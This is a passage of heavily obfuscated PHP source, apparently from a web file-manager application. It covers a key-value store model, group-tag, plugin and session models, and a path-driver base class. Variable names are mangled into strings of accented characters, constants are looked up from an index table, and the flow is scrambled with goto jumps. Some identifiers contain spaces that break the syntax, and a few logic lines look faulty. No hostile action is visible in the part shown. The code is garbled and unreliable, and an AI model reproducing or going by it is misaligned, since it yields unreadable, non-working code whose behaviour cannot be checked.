array_to_keyvalue($DÚÏó›Í´, $c‘ùÁÍ´Ü[92], $c‘ùÁÍ´Ü[370]); foreach ($DÚÏó›Í´ as $fÕ®šÂ’Öö => $D‡å¯±Ö) { if ($aÇÏ×ôÛÉÒ || in_array($fÕ®šÂ’Öö, $this->jsonField)) { $DÚÏó›Í´[$fÕ®šÂ’Öö] = json_decode($D‡å¯±Ö, !0); } } goto C¿ÙŞ‰°ŒÁ; C¿ÙŞ‰°ŒÁ: $this->cacheSet($fæŠ…ë˜ˆ®, $DÚÏó›Í´); $DÚÏó›Í´ = array_merge($EàŞ¹ÖÏ½à, $DÚÏó›Í´); return $FÚ­îÕ°¸Š ? $DÚÏó›Í´[$FÚ­îÕ°¸Š] : $DÚÏó›Í´; goto c£¯İ­í×; C¹¸Ü«Šóó: $EàŞ¹ÖÏ½à = is_array($EàŞ¹ÖÏ½à) ? $EàŞ¹ÖÏ½à : array(); if (is_array($DÚÏó›Í´)) { $DÚÏó›Í´ = array_merge($EàŞ¹ÖÏ½à, $DÚÏó›Í´); return $FÚ­îÕ°¸Š ? isset($DÚÏó›Í´[$FÚ­îÕ°¸Š]) ? $DÚÏó›Í´[$FÚ­îÕ°¸Š] : null : $DÚÏó›Í´; } $c×åÅá”Å = $this->filterWhere(array($c‘ùÁÍ´Ü[29] => $fæŠ…ë˜ˆ®)); goto D¿×™ğèÍ÷; c£¯İ­í×: } public function set($fÜÄé¹¶·‹, $D©ÂÁ·‡¯â = false, $dïÃ¡³Üë = '') { goto dá¶šóò’; dá¶šóò’: $fàÉìˆ‰š =& $_SERVER[ÉóçÄÇ]; $this->cacheRemove($dïÃ¡³Üë); $d¬‰Èª­¿ğ = array(); goto bÂ²¾‘âŠ‹; bÂ²¾‘âŠ‹: $f‡§´®Ö’ = is_array($fÜÄé¹¶·‹) ? $fÜÄé¹¶·‹ : array($fÜÄé¹¶·‹ => $D©ÂÁ·‡¯â); foreach ($f‡§´®Ö’ as $BÆÂë ãéĞ => $d¬¬›§áÃ) { if (is_array($d¬¬›§áÃ)) { $d¬¬›§áÃ = json_encode_force($d¬¬›§áÃ); } $this->checkLength($d¬¬›§áÃ, !1, $this->tableName . $fàÉìˆ‰š[4] . $fÜÄé¹¶·‹); $d¬¬›§áÃ = self::textEncode($d¬¬›§áÃ); $f‡§´®Ö’ = array($fàÉìˆ‰š[29] => $dïÃ¡³Üë, $fàÉìˆ‰š[92] => $BÆÂë ãéĞ, $fàÉìˆ‰š[370] => $d¬¬›§áÃ); $d¬‰Èª­¿ğ[] = $this->filterWhere($f‡§´®Ö’); } if (!$d¬‰Èª­¿ğ) { return !0; } goto BªÄ˜ªõÕ; BªÄ˜ªõÕ: return $this->addAll($d¬‰Èª­¿ğ, array(), !0); goto cÛëÓ¶âÂÃ; cÛëÓ¶âÂÃ: } protected function optionDefault($f¢¨Û³ÆŞá = '') { return !1; } public function setDeep($e‰É‘¯“ãé, $a†¤Ç©Êé« = false, $f‰ÜøÚ ³ = '') { $cÀŒ„¸´å„ = explode($_SERVER[ÉóçÄÇ][94], $e‰É‘¯“ãé); $fîËÜ‚‚¯µ = $this->get(); array_set_value($fîËÜ‚‚¯µ, $e‰É‘¯“ãé, $a†¤Ç©Êé«); $this->set($cÀŒ„¸´å„[0], $fîËÜ‚‚¯µ[$cÀŒ„¸´å„[0]], $f‰ÜøÚ ³); } public function remove($eÃš‚§¹Åï, $cí˜«Òª“Š = '') { $e¡­”Õõ’ =& $_SERVER[ÉóçÄÇ]; $this->cacheRemove($cí˜«Òª“Š); $B¥¥÷¯» = $this->filterWhere(array($e¡­”Õõ’[92] => $eÃš‚§¹Åï, $e¡­”Õõ’[29] => $cí˜«Òª“Š)); if (is_null($eÃš‚§¹Åï)) { unset($B¥¥÷¯»[$e¡­”Õõ’[92]]); } return $this->where($B¥¥÷¯»)->delete(); } public function cacheSet($E„¬‚Åâ½, $DïÛÓÚ‰˜ = false) { return Cache::set($this->cacheKey($E„¬‚Åâ½), $DïÛÓÚ‰˜); } public function cacheGet($B…§¯Ó­ù) { return Cache::get($this->cacheKey($B…§¯Ó­ù)); } public function cacheRemove($dÅÕíÃÙÅˆ) { return Cache::remove($this->cacheKey($dÅÕíÃÙÅˆ)); } protected function filterWhere($FÏà˜®Ø‰˜) { return $FÏà˜®Ø‰˜; } protected function cacheKey($BÇš‚•…³³) { return $BÇš‚•…³³; } } goto B‘ÇÌÌ·¢Ä; FçÑõùˆ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($eƒÆ“ßÀí‚) { $d©„ôõŒ¶ =& $_SERVER[ÉóçÄÇ]; return array($d©„ôõŒ¶[1775] => array($eƒÆ“ßÀí‚[0], $d©„ôõŒ¶[1776]), $d©„ôõŒ¶[1777] => array($eƒÆ“ßÀí‚[0], $d©„ôõŒ¶[1778])); } protected function get($B£ŒÁˆ’š) { $A’àÛòÁËí =& $_SERVER[ÉóçÄÇ]; $f–ù¸²¶ = Model($A’àÛòÁËí[480])->metaGet($B£ŒÁˆ’š, $A’àÛòÁËí[1779]); $F‰Ğ˜£ö™£ = json_decode($f–ù¸²¶, !0); return $F‰Ğ˜£ö™£ ? $F‰Ğ˜£ö™£ : array($A’àÛòÁËí[1780] => $A’àÛòÁËí[86], $A’àÛòÁËí[365] => array()); } protected function set($E‹Ú¿Éââ†, $B»¤³«ß§) { $eõ¡İÒ°½ =& $_SERVER[ÉóçÄÇ]; $B»¤³«ß§ = $B»¤³«ß§ ? $B»¤³«ß§ : array($eõ¡İÒ°½[1780] => $eõ¡İÒ°½[86], $eõ¡İÒ°½[365] => array()); Model($eõ¡İÒ°½[480])->metaSet($E‹Ú¿Éââ†, $eõ¡İÒ°½[1779], json_encode($B»¤³«ß§)); return Model($eõ¡İÒ°½[480])->metaSet($E‹Ú¿Éââ†, $eõ¡İÒ°½[1779], json_encode($B»¤³«ß§)); } protected function getByTagID($AĞ«§Š¤’™, $EÑ‘´„¨Ú¨) { goto d¯Ü§ºÅÙ; d¯Ü§ºÅÙ: $EĞö§åç¿” =& $_SERVER[ÉóçÄÇ]; if (!$AĞ«§Š¤’™ || !$EÑ‘´„¨Ú¨) { return !1; } if (!Model($EĞö§åç¿”[480])->getInfoSimple($AĞ«§Š¤’™)) { return !1; } goto B‰Áİ¦Ğ÷‚; bÅ“®ßì‘”: return is_array($c¾ñÀç‚äÜ) ? $c¾ñÀç‚äÜ : !1; goto AÍÖ¨«ºƒ; B‰Áİ¦Ğ÷‚: $c¸ÈğêõÑ = $this->get($AĞ«§Š¤’™); if (!$c¸ÈğêõÑ || !isset($c¸ÈğêõÑ[$EĞö§åç¿”[365]])) { return !1; } $c¾ñÀç‚äÜ = array_find_by_field($c¸ÈğêõÑ[$EĞö§åç¿”[365]], $EĞö§åç¿”[388], $EÑ‘´„¨Ú¨); goto bÅ“®ßì‘”; AÍÖ¨«ºƒ: } public function listSource($Bî”†¹Ïí, $B°ï¯¸¿»’) { goto AÁŞìÆ¸ò; bº¯…µƒñ: if ($bøùŸÚ·Èä) { $this->removeBySource($Bî”†¹Ïí, $bøùŸÚ·Èä); } return $FÎÆÒÙ½äæ; goto aİˆ¡“–Ó±; AÁŞìÆ¸ò: $D‰Áò£» =& $_SERVER[ÉóçÄÇ]; if ($B°ï¯¸¿»’ && !is_array($B°ï¯¸¿»’)) { $B°ï¯¸¿»’ = array($B°ï¯¸¿»’); } $A‹¶Ã¶„À = $this->listData($Bî”†¹Ïí); goto Dåºœ¦ƒ¥; Dåºœ¦ƒ¥: $b‡ŸÂÆ±«á = array(); foreach ($A‹¶Ã¶„À as $b»½Ï¥Ó¦…) { $F‘ˆçÅŠã = $b»½Ï¥Ó¦…[$D‰Áò£»[75]]; if (!$F‘ˆçÅŠã) { continue; } if (!isset($b‡ŸÂÆ±«á[$F‘ˆçÅŠã])) { $b‡ŸÂÆ±«á[$F‘ˆçÅŠã] = array(); } $b‡ŸÂÆ±«á[$F‘ˆçÅŠã][] = $b»½Ï¥Ó¦…[$D‰Áò£»[413]]; } $aì»ÓŠ£¯ñ = array(); goto f˜²Ë·Äãµ; CÆß¶Ÿ°¡‹: $f²‹‚‹Â–Ù = array_to_keyvalue($FÎÆÒÙ½äæ[$D‰Áò£»[73]], $D‰Áò£»[33], $D‰Áò£»[390]); $Bä™¹‘â‡ = array_merge($f²‹‚‹Â–Ù, $d°‘’¡¶Œæ); foreach ($aì»ÓŠ£¯ñ as $F‘ˆçÅŠã) { if (!in_array($F‘ˆçÅŠã, $Bä™¹‘â‡)) { $bøùŸÚ·Èä[] = $F‘ˆçÅŠã; } } goto bº¯…µƒñ; f˜²Ë·Äãµ: foreach ($b‡ŸÂÆ±«á as $f’‹‚¿ø => $bëš°¾¸­¦) { $E³Ûç–  = !0; if (!$B°ï¯¸¿»’) { $aì»ÓŠ£¯ñ[] = $f’‹‚¿ø; continue; } foreach ($B°ï¯¸¿»’ as $F”…Å——‚) { if (!in_array($F”…Å——‚, $bëš°¾¸­¦)) { $E³Ûç–  = !1; break; } } if ($E³Ûç– ) { $aì»ÓŠ£¯ñ[] = $f’‹‚¿ø; } } if (!$aì»ÓŠ£¯ñ) { return array(); } $FÎÆÒÙ½äæ = Model($D‰Áò£»[1186])->listSource(array($D‰Áò£»[404] => array($D‰Áò£»[405], $aì»ÓŠ£¯ñ))); goto dÑ™¾Ä©ÓØ; dÑ™¾Ä©ÓØ: if (!$FÎÆÒÙ½äæ || count($aì»ÓŠ£¯ñ) == $FÎÆÒÙ½äæ[$D‰Áò£»[362]][$D‰Áò£»[363]]) { return $FÎÆÒÙ½äæ; } $bøùŸÚ·Èä = array(); $d°‘’¡¶Œæ = array_to_keyvalue($FÎÆÒÙ½äæ[$D‰Áò£»[74]], $D‰Áò£»[33], $D‰Áò£»[390]); goto CÆß¶Ÿ°¡‹; aİˆ¡“–Ó±: } protected function listData($D’ˆ×³Ü‰Ç) { $dˆ…Æ‚‰Šœ =& $_SERVER[ÉóçÄÇ]; $Dğ¢Ñï×ÛÚ = array($dˆ…Æ‚‰Šœ[1503] => 0, $dˆ…Æ‚‰Šœ[457] => array($dˆ…Æ‚‰Šœ[1781], 0), $dˆ…Æ‚‰Šœ[409] => $dˆ…Æ‚‰Šœ[1782] . $D’ˆ×³Ü‰Ç); $F™”‚¸µæÈ = $dˆ…Æ‚‰Šœ[1783]; $féÁ¹À‡àˆ = $this->field($F™”‚¸µæÈ)->where($Dğ¢Ñï×ÛÚ)->order($dˆ…Æ‚‰Šœ[1784])->select(); return $féÁ¹À‡àˆ ? $féÁ¹À‡àˆ : array(); } protected function addToTag($føšô ½™õ, $dÛµòÙŒì, $a£ì¥É‚áø) { $F©–åòùì¬ =& $_SERVER[ÉóçÄÇ]; if (!$this->getByTagID($føšô ½™õ, $a£ì¥É‚áø) || !$dÛµòÙŒì) { return !1; } if (!Model($F©–åòùì¬[776])->pathInfo($dÛµòÙŒì)) { return !1; } $fíöØ­ÒÂ = array($F©–åòùì¬[1503] => 0, $F©–åòùì¬[457] => $a£ì¥É‚áø, $F©–åòùì¬[408] => $dÛµòÙŒì, $F©–åòùì¬[409] => $F©–åòùì¬[1785] . $føšô ½™õ, $F©–åòùì¬[407] => $F©–åòùì¬[33], $F©–åòùì¬[1678] => 0); if ($this->where($fíöØ­ÒÂ)->find()) { return !1; } return $this->add($fíöØ­ÒÂ); } protected function removeFromTag($bÇ„§ãù”, $dš‰Í†ÄÇĞ, $Fø°â¡Ü°) { $c¡…‰„¨Î’ =& $_SERVER[ÉóçÄÇ]; if (!$this->getByTagID($bÇ„§ãù”, $Fø°â¡Ü°) || !$dš‰Í†ÄÇĞ) { return !1; } if (is_array($dš‰Í†ÄÇĞ)) { $dš‰Í†ÄÇĞ = array($c¡…‰„¨Î’[7], $dš‰Í†ÄÇĞ); } $A¾ÃØÅ™Ï = array($c¡…‰„¨Î’[1503] => 0, $c¡…‰„¨Î’[457] => $Fø°â¡Ü°, $c¡…‰„¨Î’[409] => $c¡…‰„¨Î’[1785] . $bÇ„§ãù”, $c¡…‰„¨Î’[408] => $dš‰Í†ÄÇĞ); return $this->where($A¾ÃØÅ™Ï)->delete(); } protected function removeByTag($f»á™˜˜, $cÃŸ¾†ÁŒŠ) { $añÑâÆÓ¡• =& $_SERVER[ÉóçÄÇ]; if (!$this->getByTagID($f»á™˜˜, $cÃŸ¾†ÁŒŠ)) { return !1; } $BŠâ°¯Üö… = array($añÑâÆÓ¡•[1503] => 0, $añÑâÆÓ¡•[457] => $cÃŸ¾†ÁŒŠ, $añÑâÆÓ¡•[409] => $añÑâÆÓ¡•[1785] . $f»á™˜˜); return $this->where($BŠâ°¯Üö…)->delete(); } protected function removeBySource($e´Ç×ó“æ‚, $f²„»àËèÒ) { $FÓÏ¦‚ƒìÚ =& $_SERVER[ÉóçÄÇ]; if (!$e´Ç×ó“æ‚ || !$f²„»àËèÒ) { return !1; } if (is_array($f²„»àËèÒ)) { $f²„»àËèÒ = array($FÓÏ¦‚ƒìÚ[7], $f²„»àËèÒ); } $bäƒ¸·×è– = array($FÓÏ¦‚ƒìÚ[1503] => 0, $FÓÏ¦‚ƒìÚ[408] => $f²„»àËèÒ, $FÓÏ¦‚ƒìÚ[457] => array($FÓÏ¦‚ƒìÚ[953], 0), $FÓÏ¦‚ƒìÚ[409] => $FÓÏ¦‚ƒìÚ[1785] . $e´Ç×ó“æ‚); return $this->where($bäƒ¸·×è–)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\160\x6c\x75\x67\151\x6e\x4c\x69\163\x74"; public $field = array("\156\141\155\x65", "\163\164\x61\164\165\x73", "\x72\x65\x67\x69\145\163\x74", "\x63\157\x6e\x66\x69\147"); public function loadList($A³Ù §†äª = false) { $f ¯ŒÑ™ÓÎ = array_to_keyvalue($this->listData(), $_SERVER[ÉóçÄÇ][28]); if ($A³Ù §†äª) { return $f ¯ŒÑ™ÓÎ[$A³Ù §†äª]; } return $f ¯ŒÑ™ÓÎ; } public function init() { $b–¹ò¡£µ =& $_SERVER[ÉóçÄÇ]; Hook::trigger($b–¹ò¡£µ[1786]); $eõÃÉÈ²­Â = $this->loadPluginList(); foreach ($eõÃÉÈ²­Â as $e¯Îæ•„ïÓ => $f Š¯Ñ«¤¸) { $B¤¾¶Ÿ·š = $this->appAllow($e¯Îæ•„ïÓ, $f Š¯Ñ«¤¸); if (!$B¤¾¶Ÿ·š) { continue; } foreach ($f Š¯Ñ«¤¸[$b–¹ò¡£µ[1787]] as $a¯ÑÓØ•¿Ç => $b½ˆøèÅ±Ù) { Hook::bind($a¯ÑÓØ•¿Ç, $b½ˆøèÅ±Ù); } } Hook::trigger($b–¹ò¡£µ[1788]); Hook::trigger(ACTION); } public function appAllow($F—İšœ‚‰¹, $fíôæĞÜ˜, $f×õ­†…¾‹ = true) { $eåÙ¼µè¹æ =& $_SERVER[ÉóçÄÇ]; $fì­‘ø¥Ï† = PLUGIN_DIR . $F—İšœ‚‰¹ . $eåÙ¼µè¹æ[1789]; if (!is_array($fíôæĞÜ˜) || !is_array($fíôæĞÜ˜[$eåÙ¼µè¹æ[1787]]) || $fíôæĞÜ˜[$eåÙ¼µè¹æ[711]] != 1 || !is_file($fì­‘ø¥Ï†)) { return !1; } if ($GLOBALS[$eåÙ¼µè¹æ[479]] == 1) { return !0; } if ($f×õ­†…¾‹ && !Action($eåÙ¼µè¹æ[1790])->checkAuth($F—İšœ‚‰¹)) { return !1; } return !0; } public function unInstall($C÷ƒÅ„ŠÙƒ) { $aêƒÆñîä¥ =& $_SERVER[ÉóçÄÇ]; $b˜Ø’ÏÚƒÖ = $this->loadList($C÷ƒÅ„ŠÙƒ); if (file_exists(PLUGIN_DIR . $C÷ƒÅ„ŠÙƒ)) { Hook::apply($C÷ƒÅ„ŠÙƒ . $aêƒÆñîä¥[1791]); } $this->remove($b˜Ø’ÏÚƒÖ[$aêƒÆñîä¥[388]]); } public function changeStatus($a„áöù×æö, $A×•›Õ˜‹¸) { $Fâ´¢¤šÌ» =& $_SERVER[ÉóçÄÇ]; $E™æ´àÅ²Ö = $this->loadList($a„áöù×æö); if ($A×•›Õ˜‹¸) { Hook::apply($a„áöù×æö . $Fâ´¢¤šÌ»[1792]); } $this->update($E™æ´àÅ²Ö[$Fâ´¢¤šÌ»[388]], array($Fâ´¢¤šÌ»[1793] => $A×•›Õ˜‹¸)); } public function appRegist($C¡˜ŒÅùŠ³, $FèÕĞôÔ¿á) { $A’ é§ñæØ =& $_SERVER[ÉóçÄÇ]; $DÌÛ°ªçµé = $this->loadList($C¡˜ŒÅùŠ³); if ($DÌÛ°ªçµé) { $this->update($DÌÛ°ªçµé[$A’ é§ñæØ[388]], array($A’ é§ñæØ[1787] => $FèÕĞôÔ¿á)); } else { $f…–êô«„ = array($A’ é§ñæØ[28] => $C¡˜ŒÅùŠ³, $A’ é§ñæØ[1787] => $FèÕĞôÔ¿á, $A’ é§ñæØ[711] => 0, $A’ é§ñæØ[6] => $this->getConfigDefault($C¡˜ŒÅùŠ³)); $this->insert($f…–êô«„); } } public function getConfigDefault($dÓî­¹Ë’) { $C¯¤ÈÏê =& $_SERVER[ÉóçÄÇ]; $dÄÑæµ¦ä = array(); $e—Ú¹‰—©ß = $this->getPackageJson($dÓî­¹Ë’); if (!$e—Ú¹‰—©ß && is_array($e—Ú¹‰—©ß[$C¯¤ÈÏê[1794]])) { return $dÄÑæµ¦ä; } foreach ($e—Ú¹‰—©ß[$C¯¤ÈÏê[1794]] as $d‰…ƒ¾ã => $f´»˜ï´ŞÄ) { if (!isset($f´»˜ï´ŞÄ[$C¯¤ÈÏê[370]]) || isset($dÄÑæµ¦ä[$d‰…ƒ¾ã])) { continue; } $dÄÑæµ¦ä[$d‰…ƒ¾ã] = $f´»˜ï´ŞÄ[$C¯¤ÈÏê[370]]; } return $dÄÑæµ¦ä; } public function getPackageJson($cÃÎ‘èÕåô) { return Hook::apply($cÃÎ‘èÕåô . $_SERVER[ÉóçÄÇ][1795]); } public function getConfig($A«•‚‹¿Ü, $fÉ¹Œ„ÅÃ³ = false) { $e²ºÈ„‹¯ô =& $_SERVER[ÉóçÄÇ]; $c­ñîîÑ­ = array(); $e÷Şàãªìä = $this->loadList($A«•‚‹¿Ü); if ($e÷Şàãªìä && is_array($e÷Şàãªìä[$e²ºÈ„‹¯ô[6]])) { $c­ñîîÑ­ = $e÷Şàãªìä[$e²ºÈ„‹¯ô[6]]; } if (!$c­ñîîÑ­ || $fÉ¹Œ„ÅÃ³) { $c­ñîîÑ­ = $this->getConfigDefault($A«•‚‹¿Ü); } return $c­ñîîÑ­; } public function setConfig($a³Á‹Å†„§, $A¦À¶£Æà = false) { goto eó ç¶Ü¹æ; b×Ö©‹Œ®Ò: $this->update($dÖœÈŞ¨¼[$D²’ã¿ˆäÈ[388]], array($D²’ã¿ˆäÈ[6] => $eÅ›Ä‰¶¤)); goto Eé‚ìå™—ç; fÊ‰¤ŒØ: $eÅ›Ä‰¶¤ = $dÖœÈŞ¨¼[$D²’ã¿ˆäÈ[6]]; if ($A¦À¶£Æà == !1) { $eÅ›Ä‰¶¤ = array(); $A¦À¶£Æà = $this->getConfigDefault($a³Á‹Å†„§); } foreach ($A¦À¶£Æà as $b—µ …„¼¾ => $B¥ºËÈäÆ) { $eÅ›Ä‰¶¤[$b—µ …„¼¾] = is_string($B¥ºËÈäÆ) ? trim($B¥ºËÈäÆ) : $B¥ºËÈäÆ; } goto b×Ö©‹Œ®Ò; eó ç¶Ü¹æ: $D²’ã¿ˆäÈ =& $_SERVER[ÉóçÄÇ]; $dÖœÈŞ¨¼ = $this->loadList($a³Á‹Å†„§); if (!$dÖœÈŞ¨¼) { return !1; } goto fÊ‰¤ŒØ; Eé‚ìå™—ç: } public function viewList() { goto b²Æ§Ù–Ì; b²Æ§Ù–Ì: $e‚£¼ ¸ =& $_SERVER[ÉóçÄÇ]; $dŸ¬‡İ²ÃÖ = $this->loadList(); $this->pluginScan($dŸ¬‡İ²ÃÖ); goto c‹·ğóŒ—; fˆæŒ£¹ÑÙ: return $D¶§ºÇ°¶±; goto F¢³‚ŸŒÑğ; c‹·ğóŒ—: $dŸ¬‡İ²ÃÖ = $this->loadPluginList(); $D¶§ºÇ°¶± = array(); foreach ($dŸ¬‡İ²ÃÖ as $dí¬Æ­¦¿¦ => $d¦™Š¶¥Ä) { unset($d¦™Š¶¥Ä[$e‚£¼ ¸[1787]], $d¦™Š¶¥Ä[$e‚£¼ ¸[6]]); $CÇêÍ¾‰ÇË = PLUGIN_DIR . $d¦™Š¶¥Ä[$e‚£¼ ¸[28]] . $e‚£¼ ¸[1789]; if (!is_file($CÇêÍ¾‰ÇË)) { continue; } $EõÑÆ¨ŠŠ = Hook::apply($d¦™Š¶¥Ä[$e‚£¼ ¸[28]] . $e‚£¼ ¸[1795]); if (is_array($EõÑÆ¨ŠŠ)) { $D¶§ºÇ°¶±[$dí¬Æ­¦¿¦] = array_merge($d¦™Š¶¥Ä, $EõÑÆ¨ŠŠ); } } goto fˆæŒ£¹ÑÙ; F¢³‚ŸŒÑğ: } private function loadPluginList() { $EÂ©Ÿ”ÈóÒ =& $_SERVER[ÉóçÄÇ]; $eÎÉƒÂÓ ‘ = $this->loadList(); if (strtolower(MOD) == $EÂ©Ÿ”ÈóÒ[1796]) { return $eÎÉƒÂÓ ‘; } $C‚Øî­‹õ = Hook::trigger($EÂ©Ÿ”ÈóÒ[1797], $eÎÉƒÂÓ ‘); if ($eÎÉƒÂÓ ‘ && !$C‚Øî­‹õ) { die; } return $C‚Øî­‹õ ? $C‚Øî­‹õ : $eÎÉƒÂÓ ‘; } private function pluginScan($BÎ‘‚ä•Ô„) { $eµùóÉ–É =& $_SERVER[ÉóçÄÇ]; recursion_dir(PLUGIN_DIR, $B†’¹Ã“ö…, $fÔ… Ì¯Ë…, 0); foreach ($B†’¹Ã“ö… as $e‘Îª¬ÖŞ©) { $EßßÒÏ·Š… = get_path_this($e‘Îª¬ÖŞ©); if (isset($BÎ‘‚ä•Ô„[$EßßÒÏ·Š…]) || !file_exists($e‘Îª¬ÖŞ© . $eµùóÉ–É[1798]) || !file_exists($e‘Îª¬ÖŞ© . $eµùóÉ–É[1789])) { continue; } Hook::apply($EßßÒÏ·Š… . $eµùóÉ–É[1792]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\x5f\163\145\x73\x73\x69\157\156"; public function get($B¯§÷¦Ê³ò) { $dÉˆ“ò…ö  =& $_SERVER[ÉóçÄÇ]; $cÀ“ÂÄóô‰ = $this->where(array($dÉˆ“ò…ö [1799] => $B¯§÷¦Ê³ò))->find(); if (!is_array($cÀ“ÂÄóô‰)) { return !1; } return $cÀ“ÂÄóô‰[$dÉˆ“ò…ö [714]]; } public function set($f­§½•£”‹, $d•ÀÛËæÔÑ, $F…‘Ä¸ÏíÜ = 3600) { $FùÅä¿äè =& $_SERVER[ÉóçÄÇ]; $CÃ÷Èô²¦¾ = array($FùÅä¿äè[1799] => $f­§½•£”‹, $FùÅä¿äè[1707] => $d•ÀÛËæÔÑ, $FùÅä¿äè[1800] => $F…‘Ä¸ÏíÜ + time()); if (Session::get($FùÅä¿äè[1801])) { $CÃ÷Èô²¦¾[$FùÅä¿äè[1511]] = Session::get($FùÅä¿äè[1801]); } else { $CÃ÷Èô²¦¾[$FùÅä¿äè[1511]] = 0; } if ($this->get($f­§½•£”‹)) { return $this->where(array($FùÅä¿äè[1799] => $f­§½•£”‹))->save($CÃ÷Èô²¦¾); } else { return $this->add($CÃ÷Èô²¦¾, array(), !0); } } public function remove($a–“‰É™¹ò) { return $this->where(array($_SERVER[ÉóçÄÇ][1799] => $a–“‰É™¹ò))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÉóçÄÇ][1802] . time())->delete(); } } goto e²Ç³¢‘ê¾; B­¾Õù‘À: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $aõãØ™šö¨ =& $_SERVER[ÉóçÄÇ]; $this->objectDriver = array($aõãØ™šö¨[57], $aõãØ™šö¨[58], $aõãØ™šö¨[59], $aõãØ™šö¨[60], $aõãØ™šö¨[61], $aõãØ™šö¨[62], $aõãØ™šö¨[63], $aõãØ™šö¨[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($FÇ¡Õ’×Ãê) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($FÇ¡Õ’×Ãê, $_SERVER[ÉóçÄÇ][8]); } return $FÇ¡Õ’×Ãê; } public function iconvApp($dÄ¬Æ‹Œé©) { return $dÄ¬Æ‹Œé©; } public function iconvSystem($F÷ŞåÁ¯é) { return $F÷ŞåÁ¯é; } public function iconvTo($eÅá²®º¬—, $DµÍ«èŞíÎ, $d’†‰æËá˜) { goto cÜ—´»–­; dôÚ«æ÷‡: $bÅ¡ß¸ô¹ò = $DµÍ«èŞíÎ . $A°ó°ºÄß[66] . $d’†‰æËá˜ . $A°ó°ºÄß[67] . $eÅá²®º¬—; if (isset($BÀ‡İàŠóŸ[$bÅ¡ß¸ô¹ò])) { return $BÀ‡İàŠóŸ[$bÅ¡ß¸ô¹ò]; } if (function_exists($A°ó°ºÄß[68])) { $fé›ôĞø = @mb_convert_encoding($eÅá²®º¬—, $d’†‰æËá˜, $DµÍ«èŞíÎ); } else { $fé›ôĞø = @iconv($DµÍ«èŞíÎ, $d’†‰æËá˜, $eÅá²®º¬—); } goto BÛÇ¡×ÃÏ“; d»—Ê›Òâ: $BÀ‡İàŠóŸ[$d’†‰æËá˜ . $A°ó°ºÄß[66] . $DµÍ«èŞíÎ . $A°ó°ºÄß[67] . $eÅá²®º¬—] = $eÅá²®º¬—; $BÀ‡İàŠóŸ[$d’†‰æËá˜ . $A°ó°ºÄß[66] . $DµÍ«èŞíÎ . $A°ó°ºÄß[67] . $fé›ôĞø] = $eÅá²®º¬—; $BÀ‡İàŠóŸ[$DµÍ«èŞíÎ . $A°ó°ºÄß[66] . $d’†‰æËá˜ . $A°ó°ºÄß[67] . $fé›ôĞø] = $fé›ôĞø; goto dÖ¦Ü™òœÑ; dÖ¦Ü™òœÑ: return $fé›ôĞø; goto fç‚İ£¶Ò¼; cÜ—´»–­: $A°ó°ºÄß =& $_SERVER[ÉóçÄÇ]; if (!$eÅá²®º¬— || !function_exists($A°ó°ºÄß[65])) { return $eÅá²®º¬—; } static $BÀ‡İàŠóŸ = array(); goto dôÚ«æ÷‡; BÛÇ¡×ÃÏ“: $fé›ôĞø = $fé›ôĞø ? $fé›ôĞø : $eÅá²®º¬—; if (strstr($fé›ôĞø, $A°ó°ºÄß[69])) { $fé›ôĞø = str_replace($A°ó°ºÄß[69], $A°ó°ºÄß[70], $fé›ôĞø); } $BÀ‡İàŠóŸ[$DµÍ«èŞíÎ . $A°ó°ºÄß[66] . $d’†‰æËá˜ . $A°ó°ºÄß[67] . $eÅá²®º¬—] = $fé›ôĞø; goto d»—Ê›Òâ; fç‚İ£¶Ò¼: } public function getPathInner($c‰ƒ‹œàò) { $CÔâ¡ÖõÓŒ = IO::init($c‰ƒ‹œàò); return $CÔâ¡ÖõÓŒ->path; } public function getPathOuter($Dóíè·) { $AÔ¬¡Ì©ğø =& $_SERVER[ÉóçÄÇ]; $A÷ä±Ö×•Š = strlen(trim($this->pathBase, $AÔ¬¡Ì©ğø[8])); $Dóíè· = substr(trim($Dóíè·, $AÔ¬¡Ì©ğø[8]), $A÷ä±Ö×•Š); return $this->pathDriver . $AÔ¬¡Ì©ğø[8] . ltrim($Dóíè·, $AÔ¬¡Ì©ğø[8]); } public function isParentOf($aÄ£™¥æŒé, $cÕô²óË«¯) { $eó¸ÊÎùõƒ =& $_SERVER[ÉóçÄÇ]; $aÄ£™¥æŒé = rtrim(strtolower($aÄ£™¥æŒé), $eó¸ÊÎùõƒ[8]) . $eó¸ÊÎùõƒ[8]; $cÕô²óË«¯ = rtrim(strtolower($cÕô²óË«¯), $eó¸ÊÎùõƒ[8]) . $eó¸ÊÎùõƒ[8]; $E„†š¸±Š“ = strpos($cÕô²óË«¯, $aÄ£™¥æŒé) === 0; return $E„†š¸±Š“; } public function getType() { $AÚÔòİ÷ =& $_SERVER[ÉóçÄÇ]; $bŠÏ¹…–½† = str_replace($AÚÔòİ÷[71], $AÚÔòİ÷[33], get_class($this)); return strtolower($bŠÏ¹…–½†); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($EôßàßĞ, $b¤çä÷Öî¸) { $aøÜˆ«­† =& $_SERVER[ÉóçÄÇ]; $c‘ÏÓ˜§ä· = rtrim($EôßàßĞ, $aøÜˆ«­†[8]) . $aøÜˆ«­†[8] . $b¤çä÷Öî¸; $bİƒ¼å°‹ = $this->exist($c‘ÏÓ˜§ä·); return $bİƒ¼å°‹ ? $c‘ÏÓ˜§ä· : !1; } public function setModifyTime($F¦Ê…ÅƒÎ‰, $d¹‚˜÷ìè = '') { } public function renameObject($Bß¸å‡¡Ô÷, $DØ‘‡ç‰Ùì) { goto Dìö‰ÓÚà©; a‚Ş”Ğ¢Õ: return $F‘¥ÇÆÁàÙ ? $DØ‘‡ç‰Ùì : !1; goto eÄŸèé¾ì; AÈ¿ˆóğÂö: $Bß¸å‡¡Ô÷ = $this->getPathOuter($Bß¸å‡¡Ô÷); $DØ‘‡ç‰Ùì = $this->pathFather($Bß¸å‡¡Ô÷) . $DØ‘‡ç‰Ùì; if (IO::isFile($Bß¸å‡¡Ô÷)) { $F‘¥ÇÆÁàÙ = IO::copy($Bß¸å‡¡Ô÷, $this->pathFather($Bß¸å‡¡Ô÷), 